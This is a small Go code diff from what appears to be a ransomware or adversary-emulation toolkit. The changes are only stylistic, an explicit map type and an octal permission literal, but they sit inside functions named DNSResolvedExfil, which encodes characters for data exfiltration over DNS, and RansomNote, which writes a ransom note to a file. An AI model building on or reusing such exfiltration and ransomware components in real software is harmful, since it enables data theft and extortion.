@@ -121,7 +121,7 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 		var label string
 		var leftover string
 		var max int = 253 - len(domain) - 1
-		var special = map[byte]string{
+		var special map[byte]string = map[byte]string{
 			'+': ".plus",
 			'/': ".slash",
 			'=': ".equal",
@@ -331,7 +331,7 @@ func RansomNote(path string, text ...string) NotifyFunc {
 		f, e = os.OpenFile(
 			path,
 			os.O_APPEND|os.O_CREATE|os.O_RDWR,
-			0644,
+			0o644,
 		)
 		if e != nil {
 			return errors.Newf("failed to open %s: %w", path, e)
